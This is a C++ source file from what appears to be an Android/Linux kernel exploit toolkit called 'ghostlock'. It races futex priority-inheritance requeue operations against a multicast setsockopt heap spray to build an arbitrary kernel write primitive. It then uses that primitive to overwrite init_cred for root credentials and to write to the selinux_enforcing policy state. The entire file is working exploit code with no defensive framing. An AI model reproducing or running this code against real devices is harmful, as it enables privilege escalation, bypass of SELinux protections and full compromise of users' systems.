#include "route/multicast_waiter_route.h"

#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"

using namespace ghostlock;

namespace ghostlock::route::multicast_waiter {
    /* Resident Multicast Waiter route owner (CPP13). The process-level instance
 * lives at file scope so every inlined access expands exactly like the
 * validated direct reference; the kernel5_resident_* wrappers in
 * this file forward to it. The two workers and the disarm/destroy
 * helpers stay translation-unit local. */

    namespace {
        MulticastWaiterRoute multicast_resident_route;

        static double fops_elapsed_ms(struct timespec *ref) {
            return runtime_time::runtime_elapsed_ms(ref);
        }

        static void multicast_waiter_interrupt(int32_t sig) {
            (void) sig;
        }

        static long multicast_waiter_adjust(MulticastWaiterRoute *context) {
            struct sched_param sp = {.sched_priority = 0};
            int32_t next = context->scheduler_policy == SCHED_NORMAL
                           ? SCHED_BATCH
                           : SCHED_NORMAL;
            long r = syscall(SYS_sched_setscheduler,
                             context->waiter_tid.load(), next, &sp);
            context->scheduler_policy = next;
            return r;
        }

        static int32_t multicast_waiter_stamp(MulticastWaiterRoute *context,
                                          uintptr_t target, uintptr_t value,
                                          uintptr_t lock) {
            size_t size = context->layout.buffer_size;
            /* Kept dynamic: the size comes from validated profile geometry and
     * heap-backing it would enter the race window (CPP17 review, retained). */
    __extension__ unsigned char b[size];
            size_t o = context->layout.waiter_offset;
            memset(b, 0, sizeof(b));
            /* Same pure encoder as the one-shot route; the resident also stamps the
     * erase words at the waiter head. */
            if (!memory::encode_multicast_waiter(
                {reinterpret_cast<std::byte *>(b), size},
                o, context->layout.task_offset, context->layout.lock_offset,
                context->task, lock)) {
                return -1;
            }
            if (target) {
                support::put64(b, o, (target - 8) & ~static_cast<uintptr_t>(3));
                support::put64(b, o + 8, value);
            }
            uint16_t family = AF_UNSPEC;
            memcpy(b + 8, &family, sizeof(family));
            return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                              b, static_cast<socklen_t>(sizeof(b)));
        }

        static void *multicast_waiter_worker(void *arg) {
            auto *context = static_cast<MulticastWaiterRoute *>(arg);
            kernel::pin_to_core(static_cast<size_t>(context->consumer_cpu));
            sigset_t set;
            sigemptyset(&set);
            sigaddset(&set, SIGUSR1);
            pthread_sigmask(SIG_UNBLOCK, &set, nullptr);
            context->waiter_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
            support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
            context->waiter_has_lock2.store(1);
            while (!context->owner_has_lock1.load()) sched_yield();
            context->waiter_waiting.store(1);
            support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
                              0, nullptr, &context->lock1_futex, 0);
            context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
            if (context->socket_fd < 0) return nullptr;
            multicast_waiter_stamp(context, 0, 0, context->lock);
            context->waiter_ready.store(1);
            while (!context->stop_requested.load()) {
                if (context->respray_requested.exchange(0)) {
                    uintptr_t lock = context->lock + context->layout.lock_slots_offset +
                                     (static_cast<size_t>(context->lock_slot++) % context->layout.lock_slot_count) *
                                     context->layout.lock_slot_stride;
                    multicast_waiter_stamp(context, context->target, context->value, lock);
                    context->sprayed.store(1);
                }
                sched_yield();
            }
            uint32_t dummy = 0x80000000U | static_cast<uint32_t>(getpid());
            struct timespec z = {0, 0};
            support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, nullptr, 0);
            support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
            while (!context->owner_done.load()) sched_yield();
            close(context->socket_fd);
            context->socket_fd = -1;
            return nullptr;
        }

        static void *multicast_owner_worker(void *arg) {
            auto *context = static_cast<MulticastWaiterRoute *>(arg);
            kernel::pin_to_core(static_cast<size_t>(context->main_cpu));
            while (!context->waiter_has_lock2.load()) sched_yield();
            support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
            context->owner_has_lock1.store(1);
            context->owner_waiting.store(1);
            support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
            support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
            support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
            context->owner_done.store(1);
            return nullptr;
        }

        static void multicast_waiter_disarm(MulticastWaiterRoute *context) {
            context->stop_requested.store(1);
            context->race->consumer_go.store(0);
            while (context->race->consumer_inflight.load()) sched_yield();
            context->status.kernel_disarmed = 1;
        }

        static void multicast_waiter_destroy(MulticastWaiterRoute *context) {
            if (context->waiter_worker_started) {
                pthread_join(context->waiter_worker, nullptr);
                context->waiter_worker_started = 0;
            }
            if (context->owner_worker_started) {
                pthread_join(context->owner_worker, nullptr);
                context->owner_worker_started = 0;
            }
            if (context->socket_fd >= 0) {
                close(context->socket_fd);
                context->socket_fd = -1;
            }
            context->ready = 0;
            context->status.userspace_clean = 1;
            if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
                context->status.code = ROUTE_FALLBACK_SAFE;
            }
        }
    } // namespace

    int32_t MulticastWaiterRoute::start() noexcept {
        auto *context = this;
        if (context->ready) return 1;
        if (context->waiter_worker_started || context->owner_worker_started) {
            pr_warning("multicast resident remains partially armed; refusing restart\n");
            return 0;
        }
        profile::MulticastWaiterLayout layout_value =
                session::g_exploit_session.profile.multicast_layout();
        const profile::TargetProfile *profile = &session::g_exploit_session.profile;
        context->init(
            &session::g_exploit_session.race, nullptr, profile, layout_value, 1);
        context->main_cpu = config::runtime_config_snapshot().main_cpu;
        context->consumer_cpu = config::runtime_config_snapshot().consumer_cpu;
        uintptr_t bss = session::g_exploit_session.addresses.data_alias(
            kernel::KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
        context->lock = bss + layout_value.fake_lock_offset;
        context->task = bss + layout_value.fake_task_offset;
        struct sigaction sa = {};
        sa.sa_handler = multicast_waiter_interrupt;
        sigemptyset(&sa.sa_mask);
        if (sigaction(SIGUSR1, &sa, nullptr) != 0) return 0;
        if (pthread_create(&context->waiter_worker, nullptr,
                           multicast_waiter_worker, context) != 0)
            return 0;
        context->waiter_worker_started = 1;
        if (pthread_create(&context->owner_worker, nullptr,
                           multicast_owner_worker, context) != 0)
            return 0;
        context->owner_worker_started = 1;
        struct timespec ready_started;
        clock_gettime(CLOCK_MONOTONIC, &ready_started);
        while (!(context->waiter_has_lock2.load() &&
                 context->owner_has_lock1.load() &&
                 context->waiter_waiting.load() &&
                 context->owner_waiting.load())) {
            if (fops_elapsed_ms(&ready_started) >= profile->multicast_ready_timeout_ms())
                return 0;
            sched_yield();
        }
        usleep(profile->multicast_post_requeue_settle_us());
        errno = 0;
        long r = support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
                                   1, (void *) 0, &context->lock1_futex, 0);
        context->condition_futex = 1;
        syscall(SYS_tgkill, getpid(), context->waiter_tid.load(), SIGUSR1);
        if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
        clock_gettime(CLOCK_MONOTONIC, &ready_started);
        while (!context->waiter_ready.load() &&
               fops_elapsed_ms(&ready_started) < profile->multicast_ready_timeout_ms())
            sched_yield();
        if (!context->waiter_ready.load() ||
            multicast_waiter_adjust(context) < 0)
            return 0;
        usleep(profile->multicast_post_adjust_settle_us());
        context->ready = 1;
        context->status.code = ROUTE_OK;
        pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
                   bss, context->lock, context->task);
        return 1;
    }

    int32_t MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
        auto *context = this;
        if (!context->ready) return 0;
        context->target = target;
        context->value = value;
        context->sprayed.store(0);
        context->respray_requested.store(1);
        while (!context->sprayed.load()) sched_yield();
        long r = multicast_waiter_adjust(context);
        pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
        return r == 0;
    }

    void MulticastWaiterRoute::stop() noexcept {
        auto *context = this;
        if (!context->ready) {
            if (context->waiter_worker_started || context->owner_worker_started) {
                context->status.code = ROUTE_DIRTY_FAILURE;
                pr_warning("multicast resident partial setup retained for process exit\n");
            }
            return;
        }
        multicast_waiter_disarm(context);
        multicast_waiter_destroy(context);
        /* SESSION-04: the route owns only its route resources; reaping the
     * HeapContext references is the session's step after destroy. */
        session::g_exploit_session.release_resident_heap();
        pr_success("5.x resident writer disarmed\n");
    }

    MulticastWaiterRoute &resident_route(void) {
        return multicast_resident_route;
    }
} // namespace ghostlock::route::multicast_waiter

namespace ghostlock::route {
    /* Resident multicast writer wrappers (CPP13): the owning class lives in
 * multicast_waiter_route.cpp; the C-style call sites stay unchanged. */
    Status kernel5_resident_start(void) {
        return multicast_waiter::resident_route().start() != 0;
    }

    Status kernel5_resident_write(uintptr_t target, uintptr_t value) {
        return multicast_waiter::resident_route().write(target, value) != 0;
    }

    void kernel5_resident_stop(void) {
        multicast_waiter::resident_route().stop();
    }

    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        (void) request;
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        size_t stamp_size = layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            layout.waiter_offset, layout.task_offset, layout.lock_offset,
            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", layout.waiter_offset,
                       layout.task_offset, layout.lock_offset, stamp_size);
            return status;
        }
        uint16_t family = AF_UNSPEC;
        memcpy(stamp + 8, &family, sizeof(family));

        int32_t fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (fd < 0) {
            status.step = 60;
            status.error_number = errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            return status;
        }
        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        int32_t stamp_result =
                setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
        status.step = 61;
        status.error_number = errno;
        session::g_exploit_session.race.consumer_go.store(1);
        for (int32_t spin = 0; spin < 100000000 &&
                           session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
            __asm__ volatile (


        "yield"
        ::: "memory");
        session::g_exploit_session.race.consumer_go.store(0);
        while (session::g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (


        "yield"
        ::: "memory");
        close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/exploit_procedure.hpp"

namespace {
    class MulticastProcedure final : public ghostlock::session::ExploitProcedure {
    public:
        explicit MulticastProcedure(ghostlock::session::ExploitSession &session)
            : ExploitProcedure(session) {}

    protected:
        std::optional<Status> resident_write(const memory::WriteRequest &request) override {
            if (!session_.profile.multicast_resident()) return std::nullopt;
            if (!route::kernel5_resident_start()) {
                pr_warning("5.x resident multicast setup failed\n");
                return Status{false};
            }
            uintptr_t value = !request.preserve_child
                                  ? 0
                                  : (request.mode == memory::WriteMode::Credential
                                         ? session_.addresses.data_alias(session_.addresses.init_cred_image_addr())
                                         : session_.addresses.data_alias(ghostlock::profile::empty_zero_page()));
            return Status{route::kernel5_resident_write(request.target, value) != 0};
        }

        int32_t w1_attempt_cap(int32_t base) const override {
            if (session_.profile.multicast_resident()) return base;
            /* one-shot route cannot safely retry a missed W1 */
            return 1;
        }

        bool w2_fast_repair_prebuild() override {
            const memory::WriteRequest repair_request = memory::WriteRequest::make(
                session_.addresses.data_alias(session_.addresses.init_cred_image_addr()) + 8,
                memory::WriteMode::Zero, 1);
            (session_.heap.current.base) = support::prepare_good_kernel_page(repair_request);
            if (!(session_.heap.current.base) || !support::stash_prebuilt_page()) {
                pr_warning("W2 fast repair prebuild failed\n");
                support::discard_prebuilt_page();
                return false;
            }
            pr_info("W2 fast repair payload prebuilt\n");
            return true;
        }

        bool w2_fast_repair_activate() override {
            if (!support::activate_prebuilt_page()) {
                pr_warning("W2 fast repair activation failed\n");
                return false;
            }
            const memory::WriteRequest repair_request = memory::WriteRequest::make(
                session_.addresses.data_alias(session_.addresses.init_cred_image_addr()) + 8,
                memory::WriteMode::Zero, 1);
            pr_info("W2b: firing prebuilt init_cred+8 repair\n");
            session_.race.fast_repair.store(1);
            Status repaired = race::run_main_route_threads(repair_request);
            session_.race.fast_repair.store(0);
            if (!repaired) {
                pr_warning("W2 fast repair route failed\n");
                return false;
            }
            return true;
        }

        bool w1_scratch_repair() override {
            if (session_.profile.multicast_resident()) return true;
            const profile::MulticastWaiterLayout mcast =
                    session_.profile.multicast_layout();
            uintptr_t w1_scratch_poison =
                    (session_.heap.current.base) + mcast.buffer_size;
            if (!support::quarantine_reclaim_sockets()) {
                pr_warning("W1 scratch page quarantine failed\n");
                return false;
            }
            int32_t repaired = 0;
            int32_t repair_attempts =
                    session::g_exploit_session.profile.w1_scratch_repair_attempts();
            for (int32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                pr_info("W1b: private scratch repair attempt %d/%d\n",
                        repair_try, repair_attempts);
                const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
                    w1_scratch_poison, memory::WriteMode::Zero, 1);
                if (attack_write(scratch_repair, "W1b: private scratch repair")) {
                    repaired = 1;
                    break;
                }
                usleep(50000);
            }
            if (repaired) {
                pr_success("private scratch repaired; releasing quarantine\n");
                support::release_quarantined_reclaim_sockets();
                return true;
            }
            pr_warning("private scratch repair failed; keeping page quarantined\n");
            return false;
        }

        bool w1_resident_repair() override {
            if (!session_.profile.multicast_resident()) return true;
            const profile::MulticastWaiterLayout mcast =
                    session_.profile.multicast_layout();
            uintptr_t repair =
                    (session_.addresses.data_alias(kernel::KIMAGE_TEXT_BASE + mcast.fake_bss_image_offset) +
                     mcast.fake_lock_offset)
                    & ~static_cast<uintptr_t>(0x1fffff);
            if (!route::kernel5_resident_write(
                session_.addresses.data_alias(ghostlock::profile::selinux_enforcing()) + 4,
                repair)) {
                pr_warning("W1 policycap repair failed\n");
                route::kernel5_resident_stop();
                return false;
            }
            return true;
        }
    };
} // namespace

namespace ghostlock::route {
    std::unique_ptr<ghostlock::session::ExploitProcedure> make_multicast_procedure(
        ghostlock::session::ExploitSession &session) {
        return std::make_unique<MulticastProcedure>(session);
    }
} // namespace ghostlock::route
#endif // __ANDROID__
